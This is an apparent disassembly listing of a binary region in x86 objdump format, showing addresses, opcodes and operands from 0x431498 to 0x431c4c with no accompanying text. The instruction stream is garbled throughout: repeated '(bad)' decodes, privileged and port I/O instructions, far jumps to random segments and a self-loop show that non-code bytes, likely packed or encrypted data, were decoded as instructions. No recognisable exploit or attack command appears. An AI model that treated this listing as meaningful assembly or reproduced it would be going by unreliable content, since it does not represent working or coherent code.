  431498:	push   es
  431499:	or     dh,BYTE PTR [ebp+0x3d5ea16d]
  43149f:	sbb    al,0xe
  4314a1:	mov    ch,0x80
  4314a3:	mov    dl,0xb8
  4314a5:	mov    al,0xb0
  4314a7:	rcl    cl,1
  4314a9:	popf   
  4314aa:	stos   BYTE PTR es:[edi],al
  4314ab:	jbe    0x43142e
  4314ad:	mov    BYTE PTR [ebx+0x60],al
  4314b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4314b1:	(bad)  
  4314b2:	mov    fs,WORD PTR [eax]
  4314b4:	jmp    DWORD PTR [ebp-0x25e527fb]
  4314ba:	adc    DWORD PTR [eax],eax
  4314bc:	mov    bh,0xad
  4314be:	cmp    BYTE PTR [eax],dl
  4314c0:	gs adc ebp,esp
  4314c3:	cli    
  4314c4:	add    eax,0xc121b6db
  4314c9:	popf   
  4314ca:	lods   al,BYTE PTR ds:[esi]
  4314cb:	mov    edi,0xb7327ad5
  4314d0:	bound  edx,QWORD PTR cs:[edi]
  4314d3:	daa    
  4314d4:	inc    edx
  4314d5:	push   edx
  4314d6:	push   ss
  4314d7:	scas   eax,DWORD PTR es:[edi]
  4314d8:	lods   eax,DWORD PTR ds:[esi]
  4314d9:	int3   
  4314da:	test   BYTE PTR [ebp-0x4c],ch
  4314dd:	sbb    eax,0x9c4d4701
  4314e2:	and    edi,DWORD PTR [edi]
  4314e4:	pushf  
  4314e5:	pop    ss
  4314e6:	push   0x2f56b88a
  4314eb:	(bad)  
  4314ec:	dec    eax
  4314ed:	jne    0x431558
  4314ef:	stos   DWORD PTR es:[edi],eax
  4314f0:	ds ins BYTE PTR es:[edi],dx
  4314f2:	inc    ebp
  4314f3:	cmp    al,0x6d
  4314f5:	jmp    0xa14e414b
  4314fa:	fidiv  DWORD PTR [ecx-0x369523d4]
  431500:	shl    edi,0xba
  431503:	cmp    cl,BYTE PTR ds:0x3628bbcd
  431509:	inc    esp
  43150a:	out    dx,eax
  43150b:	xchg   edx,eax
  43150c:	adc    al,0x64
  43150e:	mov    tr3,esp
  431511:	mov    dh,0xad
  431513:	ins    BYTE PTR es:[edi],dx
  431514:	es sub ecx,0xffffff92
  431518:	pop    ss
  431519:	(bad)  [edi-0xb]
  43151c:	mov    cl,0xb4
  43151e:	test   DWORD PTR ds:0xbbb90214,ebx
  431524:	test   eax,0xb5570231
  431529:	std    
  43152a:	outs   dx,BYTE PTR ds:[esi]
  43152b:	ins    BYTE PTR es:[edi],dx
  43152c:	repnz xor ah,BYTE PTR [eax]
  43152f:	push   ebp
  431530:	mov    ebp,0x3924e68
  431535:	mov    al,ds:0x42826a09
  43153a:	add    dh,cl
  43153c:	xchg   ebx,eax
  43153d:	fld    TBYTE PTR [ebp-0x55859575]
  431543:	retf   0xc083
  431546:	stos   BYTE PTR es:[edi],al
  431547:	mov    WORD PTR [edx-0x51],fs
  43154a:	cs xor al,0x4
  43154d:	in     al,dx
  43154e:	fsub   QWORD PTR [edx]
  431550:	loopne 0x43158c
  431552:	push   ebx
  431553:	add    ch,BYTE PTR [esi]
  431555:	ins    BYTE PTR es:[edi],dx
  431556:	adc    eax,0xd8f77a6c
  43155b:	call   0x5ab5:0x6036801b
  431562:	add    al,0xe
  431564:	fwait
  431565:	adc    al,BYTE PTR [esi+0x1057442a]
  43156b:	(bad)  
  43156c:	sbb    al,0x5d
  43156e:	mov    dh,0xb0
  431570:	sbb    DWORD PTR [eax-0x80],ebx
  431573:	add    DWORD PTR [eax],esi
  431575:	inc    edi
  431576:	or     al,0x2b
  431578:	and    ecx,DWORD PTR [edx+0x45]
  43157b:	test   eax,0xca3ee801
  431580:	jno    0x431572
  431582:	cmp    esp,DWORD PTR [edx-0x34b44aac]
  431588:	push   edi
  431589:	neg    BYTE PTR [eax+0x7b76d0db]
  43158f:	add    bl,0x8
  431592:	retf   
  431593:	inc    esp
  431594:	inc    BYTE PTR [ecx-0xf]
  431597:	jbe    0x431594
  431599:	fdiv   DWORD PTR [esi]
  43159b:	je     0x4315c5
  43159d:	ins    BYTE PTR es:[edi],dx
  43159e:	add    dl,BYTE PTR [edx-0x1ac9dfd]
  4315a4:	inc    esi
  4315a5:	xor    cl,BYTE PTR [ebp+0x5]
  4315a8:	mov    bh,0x8d
  4315aa:	pop    edx
  4315ab:	pop    esp
  4315ac:	inc    esp
  4315ad:	xchg   ebx,eax
  4315ae:	dec    edx
  4315af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4315b0:	push   cs
  4315b1:	add    eax,0x4ea22ec0
  4315b6:	ret    
  4315b7:	cmp    al,0x2e
  4315b9:	inc    ebx
  4315ba:	adc    BYTE PTR [ebp+0x6e3c87d6],cl
  4315c0:	or     eax,0xaec4532d
  4315c5:	(bad)  
  4315c6:	out    dx,al
  4315c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4315c8:	or     DWORD PTR [esi+ecx*8+0xb05b006],ecx
  4315cf:	pop    ebx
  4315d0:	xchg   ebx,eax
  4315d1:	into   
  4315d2:	push   esp
  4315d3:	and    BYTE PTR [ebx+ebp*8],0x9a
  4315d7:	aam    0xa
  4315d9:	je     0x4315ef
  4315db:	jp     0x4315b1
  4315dd:	(bad)  
  4315de:	call   FWORD PTR [ebx-0x34fa25f6]
  4315e4:	call   0x90d4a645
  4315e9:	mov    gs,WORD PTR [edx-0x5d9dbaca]
  4315ef:	jbe    0x43163d
  4315f1:	in     eax,dx
  4315f2:	(bad)  
  4315f3:	adc    ch,al
  4315f5:	(bad)  
  4315f6:	jle    0x431584
  4315f8:	jb     0x4315bc
  4315fa:	test   BYTE PTR [ebp+0x20],bl
  4315fd:	add    DWORD PTR [esi+edi*4+0x6d],ebx
  431601:	pop    ss
  431602:	ins    BYTE PTR es:[edi],dx
  431603:	mov    dh,0xfc
  431605:	sub    BYTE PTR [eax],al
  431607:	bound  esi,QWORD PTR [ecx]
  431609:	inc    eax
  43160a:	ins    BYTE PTR es:[edi],dx
  43160b:	sub    al,0xb5
  43160d:	sbb    eax,0x17fd9291
  431612:	adc    al,0x7b
  431614:	inc    ebp
  431615:	add    ebp,0x76
  431618:	sub    eax,DWORD PTR [edi+edi*4-0x80]
  43161c:	imul   eax,esp,0x53
  43161f:	mov    al,ds:0x51da26c4
  431624:	cmp    BYTE PTR [eax-0x2e4fc004],ch
  43162a:	mov    ch,0x2d
  43162c:	xor    al,0x44
  43162e:	popa   
  43162f:	mov    eax,0xefd47907
  431634:	sub    eax,0x1b52b620
  431639:	jp     0x43169d
  43163b:	mov    ebp,DWORD PTR [eax+0xe]
  43163e:	add    BYTE PTR [esi-0x1ccfac79],dh
  431644:	jnp    0x4316b7
  431646:	imul   edi,DWORD PTR [ebx+0x5efee388],0x5f
  43164d:	inc    edi
  43164e:	xor    bl,BYTE PTR [edx]
  431650:	test   al,0xab
  431652:	sub    BYTE PTR [esi],bh
  431654:	mov    esi,0x9f37f56c
  431659:	sub    bl,al
  43165b:	outs   dx,BYTE PTR ds:[esi]
  43165c:	lea    edi,[edi]
  43165e:	lods   eax,DWORD PTR ds:[esi]
  43165f:	rcl    BYTE PTR [edx],cl
  431661:	es mov ebp,0x6c1435b1
  431667:	jge    0x4316ad
  431669:	adc    bl,ch
  43166b:	dec    esi
  43166c:	dec    edx
  43166d:	lahf   
  43166e:	mov    al,ds:0x51b82a86
  431673:	sub    eax,DWORD PTR [edi-0x7f9283e7]
  431679:	push   0x1ff5b683
  43167e:	and    DWORD PTR [edx],esi
  431680:	jmp    0x5bc:0xb5b6f2c6
  431687:	jb     0x431689
  431689:	xlat   BYTE PTR ds:[ebx]
  43168a:	(bad)  
  43168b:	mov    ds:0x6a85b0f2,al
  431690:	mov    eax,ds:0x10101383
  431695:	stc    
  431696:	sbb    al,BYTE PTR [esp+eax*8-0x72]
  43169a:	and    BYTE PTR [eax+ecx*2],0xd4
  43169e:	jno    0x431651
  4316a0:	add    edi,DWORD PTR [edx-0x6e32e72b]
  4316a6:	ja     0x431639
  4316a8:	test   eax,0x2e029642
  4316ad:	jne    0x4316ef
  4316af:	loopne 0x43172a
  4316b1:	push   esi
  4316b2:	pop    ds
  4316b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316b4:	ins    BYTE PTR es:[edi],dx
  4316b5:	and    eax,0xede58ba0
  4316ba:	add    BYTE PTR [edx],0x62
  4316bd:	fiadd  DWORD PTR [eax-0x50]
  4316c0:	add    BYTE PTR [ebx+ebp*8+0x4d],ch
  4316c4:	xchg   esp,eax
  4316c5:	ficomp DWORD PTR [ebx+0x17]
  4316c8:	call   0x43ba:0xe2f1c122
  4316cf:	and    dh,BYTE PTR [esi+0x6c3e02a9]
  4316d5:	push   0x1f5088d3
  4316da:	fldcw  WORD PTR [esi]
  4316dc:	xor    al,0x4
  4316de:	mov    ch,0x72
  4316e0:	loope  0x431674
  4316e2:	arpl   WORD PTR [edx-0x525d83d0],ax
  4316e8:	fadd   DWORD PTR gs:[esi+0x206a2a35]
  4316ef:	outs   dx,BYTE PTR ds:[esi]
  4316f0:	mov    dh,0x2e
  4316f2:	pusha  
  4316f3:	fist   DWORD PTR [eax-0x7e]
  4316f6:	jp     0x431713
  4316f8:	add    BYTE PTR [eax],dh
  4316fa:	(bad)  
  4316fb:	adc    al,0x4
  4316fd:	mov    bh,0x16
  4316ff:	push   ss
  431700:	std    
  431701:	cmp    eax,0x670f576
  431706:	sub    DWORD PTR [ebx],ebx
  431708:	sub    ah,BYTE PTR [edx+0x53]
  43170b:	push   0x288ca22f
  431710:	(bad)  
  431711:	sbb    esp,DWORD PTR ds:0x6c611447
  431717:	lea    esp,[edi]
  431719:	sub    DWORD PTR [edx+0x1],esi
  43171c:	ins    DWORD PTR es:[edi],dx
  43171d:	cwde   
  43171e:	or     edi,DWORD PTR [ebx]
  431720:	(bad)  
  431721:	rol    DWORD PTR [esi],1
  431723:	(bad)  [esi-0x62]
  431726:	cmp    dl,bh
  431728:	mov    esi,0x67985ab0
  43172d:	sub    DWORD PTR [edx+0x3923576d],esp
  431733:	fcmovne st,st(3)
  431735:	fcom   st(3)
  431737:	ficom  DWORD PTR [ebp-0x2c]
  43173a:	lods   eax,DWORD PTR ds:[esi]
  43173b:	rcr    DWORD PTR [ebp+esi*4-0x7d],1
  43173f:	(bad)  
  431740:	push   ss
  431741:	stos   BYTE PTR es:[edi],al
  431742:	ins    DWORD PTR es:[edi],dx
  431743:	and    edx,DWORD PTR [esi-0x71f0362]
  431749:	add    al,0x3e
  43174b:	jge    0x43176d
  43174d:	mov    ah,0x41
  43174f:	sbb    BYTE PTR [edx-0x7ccff1c4],al
  431755:	mov    dh,0x54
  431757:	aam    0xba
  431759:	cwde   
  43175a:	inc    edi
  43175b:	mov    esp,ds
  43175d:	cld    
  43175e:	mov    ebp,0x816d8d6e
  431763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431764:	jge    0x4317bc
  431766:	dec    eax
  431767:	add    eax,0xb85a11da
  43176c:	rol    BYTE PTR [eax+eax*8-0x25],1
  431770:	mov    bl,0xef
  431772:	adc    eax,DWORD PTR [edx+0x47600b89]
  431778:	ins    DWORD PTR es:[edi],dx
  431779:	mov    al,ds:0xc020a210
  43177e:	repz xchg ebx,eax
  431780:	push   0x26aae8a1
  431785:	inc    eax
  431786:	fimul  WORD PTR [ecx+0x58]
  431789:	push   0x6c
  43178b:	add    BYTE PTR [ebx-0x59],ch
  43178e:	pop    eax
  43178f:	ins    BYTE PTR es:[edi],dx
  431790:	fwait
  431791:	pop    ebx
  431792:	pop    es
  431793:	shl    DWORD PTR [esi+0x261a0d5d],1
  431799:	push   0x80933e77
  43179e:	dec    ebx
  43179f:	or     ebx,ebx
  4317a1:	push   edx
  4317a2:	sub    BYTE PTR [edx-0x2995945a],ch
  4317a8:	cs mov esp,0xd8203a41
  4317ae:	cs ret 
  4317b0:	repz fnsave [esi+0x64]
  4317b4:	je     0x431775
  4317b6:	pop    edx
  4317b7:	mov    BYTE PTR [esi],dl
  4317b9:	lods   al,BYTE PTR fs:[esi]
  4317bb:	ins    DWORD PTR es:[edi],dx
  4317bc:	xor    edx,DWORD PTR [esi+0x6c]
  4317bf:	inc    edi
  4317c0:	shl    BYTE PTR [esi+0x6b],1
  4317c3:	imul   ecx,DWORD PTR [ecx-0x6e2f478c],0xffffffe7
  4317ca:	sbb    eax,0x42dba20f
  4317cf:	push   edi
  4317d0:	rcr    BYTE PTR [edi-0x6aac4063],1
  4317d6:	cmp    dl,BYTE PTR [ecx+0x70]
  4317d9:	mov    eax,ds:0xd193401
  4317de:	rcr    BYTE PTR [eax],cl
  4317e0:	cli    
  4317e1:	mov    eax,0xfa9c7615
  4317e6:	dec    eax
  4317e7:	pop    es
  4317e8:	retf   
  4317e9:	cwde   
  4317ea:	jne    0x4317c4
  4317ec:	ret    
  4317ed:	mov    dh,0xb0
  4317ef:	ins    DWORD PTR es:[edi],dx
  4317f0:	lea    esp,[esi+0x62]
  4317f3:	pop    ebx
  4317f4:	push   cs
  4317f5:	ret    
  4317f6:	sbb    DWORD PTR [eax-0x77],ecx
  4317f9:	mov    ah,0x21
  4317fb:	mov    ds:0xc6b676db,al
  431800:	dec    edx
  431801:	push   ds
  431802:	jo     0x431810
  431804:	push   ebx
  431805:	ins    BYTE PTR es:[edi],dx
  431806:	pop    esp
  431807:	mov    al,cl
  431809:	not    DWORD PTR [ebx-0x170b6f53]
  43180f:	inc    edi
  431810:	mov    al,0x2b
  431812:	push   0x7e
  431814:	sub    al,0x54
  431816:	mov    bl,0x7f
  431818:	xchg   edi,eax
  431819:	ss pop edx
  43181b:	adc    eax,0x86c6046d
  431820:	pushf  
  431821:	xor    ah,cl
  431823:	dec    ebp
  431824:	add    eax,0x5235023f
  431829:	into   
  43182a:	inc    ecx
  43182b:	push   ecx
  43182c:	fidiv  DWORD PTR [esi+0x33]
  43182f:	mov    ah,0xcb
  431831:	xor    bl,BYTE PTR [ecx]
  431833:	dec    edx
  431834:	sti    
  431835:	jnp    0x4318b1
  431837:	iret   
  431838:	bound  ebx,QWORD PTR [ebx-0x28]
  43183b:	xchg   esi,eax
  43183c:	push   ss
  43183d:	popf   
  43183e:	sahf   
  43183f:	push   cs
  431840:	ds gs and al,0xee
  431844:	das    
  431845:	sub    DWORD PTR [edx+0x2745535],edi
  43184b:	inc    edx
  43184c:	add    ah,BYTE PTR [esi+edi*8+0x73]
  431850:	daa    
  431851:	add    DWORD PTR [edi],edx
  431853:	cmp    ah,BYTE PTR [edx]
  431855:	or     BYTE PTR [eax-0x59ab695d],cl
  43185b:	loopne 0x431833
  43185d:	adc    al,0xa2
  43185f:	cld    
  431860:	es idiv DWORD PTR fs:[ebx+0x56]
  431865:	add    edx,esp
  431867:	lods   eax,DWORD PTR ds:[esi]
  431868:	fistp  QWORD PTR [edi-0x7d]
  43186b:	je     0x431804
  43186d:	lds    esp,FWORD PTR ds:0xd2e2a0ea
  431873:	cmp    eax,DWORD PTR [edx+eiz*2-0x38]
  431877:	mov    ebp,0x501f01a6
  43187c:	pop    esp
  43187d:	pop    ss
  43187e:	mov    ch,0x2b
  431880:	sub    DWORD PTR [ebp-0x72],0xffffffa8
  431884:	pop    ebx
  431885:	push   ebx
  431886:	test   DWORD PTR [eax+0x5],0xbb9b6e0a
  43188d:	mov    cl,0x2d
  43188f:	adc    BYTE PTR [ebx+0x78868f93],ah
  431895:	mov    dl,0xa7
  431897:	inc    edi
  431898:	sbb    ebp,DWORD PTR [ebx+ebx*2+0x5b]
  43189c:	sbb    eax,0x89125e91
  4318a1:	mov    al,0x68
  4318a3:	sub    BYTE PTR [eax+0x6b],0xb
  4318a7:	add    BYTE PTR [ecx+0x1a],bh
  4318aa:	shl    DWORD PTR [edx],1
  4318ac:	mov    BYTE PTR [ebx],cl
  4318ae:	sub    al,0xb1
  4318b0:	in     eax,0xd0
  4318b2:	aaa    
  4318b3:	ret    0x2ddc
  4318b6:	jne    0x43189b
  4318b8:	adc    al,0xd1
  4318ba:	lods   eax,DWORD PTR ds:[esi]
  4318bb:	adc    DWORD PTR [edx],ebx
  4318bd:	mov    edi,0xd8d022c8
  4318c2:	pusha  
  4318c3:	fcmovnu st,st(1)
  4318c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318c6:	jl     0x43188d
  4318c8:	xor    DWORD PTR fs:[ebp+0x541adb36],0xffffffbb
  4318d0:	adc    BYTE PTR ds:0xe6022c6a,ah
  4318d6:	gs in  al,dx
  4318d8:	push   edi
  4318d9:	stc    
  4318da:	shl    BYTE PTR [esi+0x6d],cl
  4318dd:	dec    eax
  4318de:	adc    al,0x7a
  4318e0:	mov    esp,0x44990081
  4318e5:	inc    ebx
  4318e6:	rol    BYTE PTR [ebp+0x1bb02a2f],1
  4318ec:	dec    esp
  4318ed:	imul   edx,ebx,0x36d46e2
  4318f3:	enter  0x209d,0x23
  4318f7:	push   edx
  4318f8:	jmp    0xec38:0x40d140bb
  4318ff:	xor    edi,ebp
  431901:	mov    ch,0xed
  431903:	mov    dh,0x75
  431905:	push   eax
  431906:	cmp    ecx,DWORD PTR [ebp+edx*4-0x119f6da]
  43190d:	fimul  DWORD PTR [edi+0x2db6d406]
  431913:	xor    eax,0xb6148cdd
  431918:	(bad)  
  431919:	cmp    al,0x88
  43191b:	ss add ah,al
  43191e:	cmp    edi,ecx
  431920:	call   0xb7948ef7
  431925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431926:	xor    al,0xfa
  431928:	cmp    BYTE PTR [edx-0x2f759f9c],0x50
  43192f:	pop    ebx
  431930:	mov    edx,0x831104f2
  431935:	pop    es
  431936:	mov    eax,ds:0xb0b653a7
  43193b:	aad    0x14
  43193d:	mov    BYTE PTR [ebp-0xf],ah
  431940:	mov    ds:0x6eb0be37,al
  431945:	in     eax,dx
  431946:	rcl    dl,cl
  431948:	ds (bad) 
  43194a:	pop    eax
  43194b:	sub    al,0xf8
  43194d:	sbb    eax,0xe3bb623
  431952:	push   ecx
  431953:	sbb    ebx,DWORD PTR [ebx+0x5b1605a0]
  431959:	fld    TBYTE PTR [ebp+0x4d6e82ae]
  43195f:	push   edx
  431960:	or     BYTE PTR [eax],bh
  431962:	jge    0x4319b9
  431964:	das    
  431965:	outs   dx,BYTE PTR ds:[esi]
  431966:	je     0x431979
  431968:	les    ecx,FWORD PTR [ebx-0x6c3a4a8a]
  43196e:	leave  
  43196f:	mov    al,ds:0xa286dadd
  431974:	in     eax,dx
  431975:	xchg   ebx,eax
  431976:	in     eax,0x6b
  431978:	stos   BYTE PTR es:[edi],al
  431979:	ins    BYTE PTR es:[edi],dx
  43197a:	loop   0x431932
  43197c:	ins    DWORD PTR es:[edi],dx
  43197d:	pop    ebp
  43197e:	adc    al,0xec
  431980:	js     0x431971
  431982:	sbb    DWORD PTR [ecx+0x52e28f18],esp
  431988:	icebp  
  431989:	jmp    0x2e71:0xbbda0f66
  431990:	dec    ebx
  431991:	pop    ebx
  431992:	mov    DWORD PTR [eax+0x7],edi
  431995:	popf   
  431996:	adc    al,0x26
  431998:	xlat   BYTE PTR ds:[ebx]
  431999:	es pop edx
  43199b:	mov    dh,0xad
  43199d:	sub    ebp,DWORD PTR [esi+0x1d]
  4319a0:	aaa    
  4319a1:	and    DWORD PTR [edx-0x4f5c91d5],esp
  4319a7:	pop    esi
  4319a8:	mov    ch,0x75
  4319aa:	inc    ecx
  4319ab:	xchg   edi,eax
  4319ac:	inc    ecx
  4319ad:	xor    ah,bh
  4319af:	enter  0x411f,0x65
  4319b3:	pop    eax
  4319b4:	jb     0x43196b
  4319b6:	mov    ch,0x46
  4319b8:	mov    ch,0x61
  4319ba:	mov    edi,0x4bb62095
  4319bf:	dec    ebp
  4319c0:	inc    ecx
  4319c1:	pop    ebp
  4319c2:	imul   ecx,DWORD PTR cs:[esi+ebx*1-0x2],0xffffffaa
  4319c8:	loop   0x4319b7
  4319ca:	(bad)  
  4319cb:	in     eax,0xa0
  4319cd:	pcmpeqd mm4,QWORD PTR [eax-0xec67640]
  4319d4:	xchg   edx,eax
  4319d5:	(bad)  
  4319d6:	lods   eax,DWORD PTR ds:[esi]
  4319d7:	inc    esp
  4319d8:	ins    BYTE PTR es:[edi],dx
  4319d9:	xor    dl,BYTE PTR [edi+0x8]
  4319dc:	sahf   
  4319dd:	sub    cl,BYTE PTR [ebp-0x48]
  4319e0:	fstp   TBYTE PTR [edx+0x34b98250]
  4319e6:	stc    
  4319e7:	mov    edx,0x82e06e4c
  4319ec:	fsubr  DWORD PTR [esi+0x65]
  4319ef:	dec    ebx
  4319f0:	push   eax
  4319f1:	sbb    eax,0xb02c233b
  4319f6:	xor    eax,0x5fe8654a
  4319fb:	hlt    
  4319fc:	inc    edi
  4319fd:	shr    ebp,0xc2
  431a00:	(bad)  
  431a01:	push   ebp
  431a02:	popf   
  431a03:	fstp   DWORD PTR [ebx-0x3324e04f]
  431a09:	repnz mov eax,0x1d6db1b0
  431a0f:	cli    
  431a10:	pop    ss
  431a11:	or     eax,DWORD PTR [ebx]
  431a13:	sbb    al,0xa
  431a15:	iret   
  431a16:	scas   eax,DWORD PTR es:[edi]
  431a17:	shl    BYTE PTR [ebp+0x61102226],1
  431a1d:	mov    eax,ds:0x8a0e7299
  431a22:	fadd   DWORD PTR [eax]
  431a24:	and    ebx,DWORD PTR [ebp+eax*1-0x7aead498]
  431a2b:	mov    ds:0xe95e083a,al
  431a30:	jmp    0x4319d2
  431a32:	inc    esi
  431a33:	popa   
  431a34:	jne    0x431a8b
  431a36:	aam    0x40
  431a38:	inc    ebp
  431a39:	or     bl,bl
  431a3b:	ss push ebp
  431a3d:	jo     0x431a50
  431a3f:	cli    
  431a40:	sbb    eax,DWORD PTR [edi+0x20e9f8fd]
  431a46:	ins    DWORD PTR es:[edi],dx
  431a47:	mov    ah,0xdb
  431a49:	inc    esi
  431a4a:	jle    0x431a6c
  431a4c:	ret    0x5dac
  431a4f:	inc    esp
  431a50:	push   esp
  431a51:	(bad)  
  431a52:	push   eax
  431a53:	mov    ch,0x5b
  431a55:	mov    ebx,0x23566895
  431a5a:	out    0xc0,al
  431a5c:	les    edx,FWORD PTR [eax+0x2a]
  431a5f:	fadd   DWORD PTR [eax+esi*4-0x71]
  431a63:	rcr    BYTE PTR [ecx-0x4efb5130],cl
  431a69:	fnstsw WORD PTR [edx-0x3685b7e6]
  431a6f:	(bad)  [esi-0x4f]
  431a72:	xor    BYTE PTR [esi-0x3987e2f5],0xa9
  431a79:	mov    bh,0x3
  431a7b:	enter  0x700a,0x5b
  431a7f:	mov    dh,0x6
  431a81:	int3   
  431a82:	xchg   esp,eax
  431a83:	fld    QWORD PTR [eax]
  431a85:	dec    ebp
  431a86:	mov    al,0xf
  431a88:	mov    dl,0xa8
  431a8a:	pop    ebx
  431a8b:	fild   DWORD PTR [ecx]
  431a8d:	sub    eax,0xe38f4535
  431a92:	push   ds
  431a93:	adc    eax,0x2bb6b6d8
  431a98:	push   esi
  431a99:	enter  0x53c,0x41
  431a9d:	add    DWORD PTR [ebx+0x4175b8b],0xffffffdc
  431aa4:	stc    
  431aa5:	push   ss
  431aa6:	stos   DWORD PTR es:[di],eax
  431aa8:	out    dx,eax
  431aa9:	cmp    BYTE PTR [edi],dl
  431aab:	ins    BYTE PTR es:[edi],dx
  431aac:	push   eax
  431aad:	sub    eax,0x1fda7395
  431ab2:	mov    edx,edx
  431ab4:	rcl    cl,1
  431ab6:	inc    esi
  431ab7:	inc    ebx
  431ab8:	js     0x431aeb
  431aba:	sub    bh,BYTE PTR [eax-0x45]
  431abd:	imul   esp,DWORD PTR [edx-0x41523bca],0x3b
  431ac4:	pop    esi
  431ac5:	inc    ecx
  431ac6:	mul    BYTE PTR [eax]
  431ac8:	lahf   
  431ac9:	pop    es
  431aca:	inc    ecx
  431acb:	xchg   edi,eax
  431acc:	sbb    cl,BYTE PTR [edi]
  431ace:	lahf   
  431acf:	sbb    DWORD PTR [edx-0x1d],0x59
  431ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431ad4:	adc    dh,BYTE PTR [ecx+edx*2+0x4b3f7325]
  431adb:	xchg   BYTE PTR [eax-0x5f],ch
  431ade:	push   ss
  431adf:	retf   0x7954
  431ae2:	sub    BYTE PTR [eax+0x13],al
  431ae5:	fdiv   DWORD PTR [esi]
  431ae7:	outs   dx,BYTE PTR ds:[esi]
  431ae8:	and    DWORD PTR [ebx],0xd4aac4d8
  431aee:	push   esp
  431aef:	enter  0x6b6d,0x9b
  431af3:	mov    BYTE PTR [edi+0x48],bh
  431af6:	pop    edi
  431af7:	or     ebx,DWORD PTR [edi+0x2d]
  431afa:	xlat   BYTE PTR ds:[ebx]
  431afb:	fnsave [esi]
  431afd:	ss mov dh,0x8
  431b00:	pop    ecx
  431b01:	or     al,0x3
  431b03:	sub    ah,bh
  431b05:	pop    ebp
  431b06:	jge    0x431ab6
  431b08:	lahf   
  431b09:	sub    BYTE PTR [eax+edx*8+0x50],al
  431b0d:	ds out 0xf1,eax
  431b10:	lods   eax,DWORD PTR ds:[esi]
  431b11:	mov    DWORD PTR [edx-0x1f307da5],ebp
  431b17:	jmp    0x85a2:0x58989757
  431b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431b1f:	jmp    0x431b1f
  431b21:	in     al,0xf4
  431b23:	outs   dx,BYTE PTR ds:[esi]
  431b24:	lahf   
  431b25:	add    bl,BYTE PTR [ebp+0x55]
  431b28:	ins    DWORD PTR es:[edi],dx
  431b29:	and    BYTE PTR [edx],0xd6
  431b2c:	sub    BYTE PTR [esi-0x56],0xe8
  431b30:	mov    ds:0xb6f5b5ba,al
  431b35:	(bad)
  431b38:	shl    DWORD PTR [ebp+0x5b768a5b],1
  431b3e:	jns    0x431afd
  431b40:	xlat   BYTE PTR ds:[ebx]
  431b41:	cld    
  431b42:	aad    0x4a
  431b44:	xor    al,0x72
  431b46:	bound  ebp,QWORD PTR [ecx]
  431b48:	call   0x506a6213
  431b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431b4e:	call   0xb5f7fe80
  431b53:	pop    ebp
  431b54:	mov    ch,0x65
  431b56:	dec    DWORD PTR [edx]
  431b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431b59:	iret   
  431b5a:	mov    WORD PTR [esi+0x7],ss
  431b5d:	mov    al,ds:0x2941ab73
  431b62:	and    dl,bh
  431b64:	aaa    
  431b65:	dec    ebp
  431b66:	adc    eax,0xa3e95a17
  431b6b:	into   
  431b6c:	mov    ebx,0xdbd3fa05
  431b71:	mov    fs,WORD PTR [edx]
  431b73:	mov    dh,0xdd
  431b75:	loopne 0x431be2
  431b77:	pavgb  mm1,QWORD PTR [eax+eax*4]
  431b7b:	popf   
  431b7c:	pusha  
  431b7d:	push   edi
  431b7e:	mov    al,0x6d
  431b80:	jp     0x431bc0
  431b82:	xlat   BYTE PTR ds:[ebx]
  431b83:	lods   eax,DWORD PTR ds:[esi]
  431b84:	push   ebx
  431b85:	shr    BYTE PTR [ecx+0x81ab714],0x3b
  431b8c:	jmp    0x79de5b0
  431b91:	inc    eax
  431b92:	mov    bh,0x4e
  431b94:	fisttp QWORD PTR [eax-0x22c8b76d]
  431b9a:	cmp    cl,BYTE PTR [eax-0x76bb5ba5]
  431ba0:	imul   BYTE PTR [eax-0x3a76afa6]
  431ba6:	mov    bl,al
  431ba8:	jbe    0x431bbb
  431baa:	pusha  
  431bab:	int    0x34
  431bad:	mov    bl,0x7c
  431baf:	adc    al,0xc4
  431bb1:	sub    eax,0xdb37663a
  431bb6:	cmp    eax,0x6d0b0b7e
  431bbb:	(bad)  ds:0xa5a7c722
  431bc1:	cwde   
  431bc2:	jns    0x431b61
  431bc4:	lods   al,BYTE PTR ds:[esi]
  431bc5:	imul   ebx,DWORD PTR [ebx+0x36],0x89a4b46e
  431bcc:	sbb    al,cl
  431bce:	pop    ebp
  431bcf:	mov    cl,0x72
  431bd1:	or     DWORD PTR [edx+0x6db68fc0],ebp
  431bd7:	pop    esi
  431bd8:	push   eax
  431bd9:	pop    ebx
  431bda:	ds inc esp
  431bdc:	test   eax,0xba1ffe87
  431be1:	aad    0x55
  431be3:	or     al,0xd8
  431be5:	retf   0x2331
  431be8:	sub    al,0x92
  431bea:	xchg   ecx,eax
  431beb:	jmp    0xc146:0xfc055342
  431bf2:	aad    0xa0
  431bf4:	shr    BYTE PTR [ebp-0x15],0x8a
  431bf8:	popf   
  431bf9:	sub    ebp,DWORD PTR [esi+ecx*2]
  431bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431bfd:	pop    ebp
  431bfe:	mov    DWORD PTR [esi+esi*4],esi
  431c01:	dec    ebx
  431c02:	dec    ebp
  431c03:	pop    eax
  431c04:	ds push cs
  431c06:	or     BYTE PTR [eax+0x1e93b0b5],bh
  431c0c:	inc    eax
  431c0d:	sub    eax,0x384b3604
  431c12:	jo     0x431c7f
  431c14:	or     esi,DWORD PTR [edi]
  431c16:	shl    BYTE PTR ds:0xf586ac4f,0x56
  431c1d:	cmp    eax,0x3620ba37
  431c22:	add    DWORD PTR [eax],edx
  431c24:	shl    BYTE PTR [ecx-0x3cbf5104],0x52
  431c2b:	and    DWORD PTR [esi+0x6a766062],0xffffffdb
  431c32:	push   esi
  431c33:	fist   DWORD PTR [ecx-0xe]
  431c36:	jge    0x431c9e
  431c38:	repnz pop ebx
  431c3a:	sub    BYTE PTR [ebx+0x6e21adf6],bl
  431c40:	lea    eax,[ebp+0x30dc3896]
  431c46:	dec    esi
  431c47:	adc    eax,0x4b5ab6ce
  431c4c:	fstp   TBYTE PTR [esi-0x34]
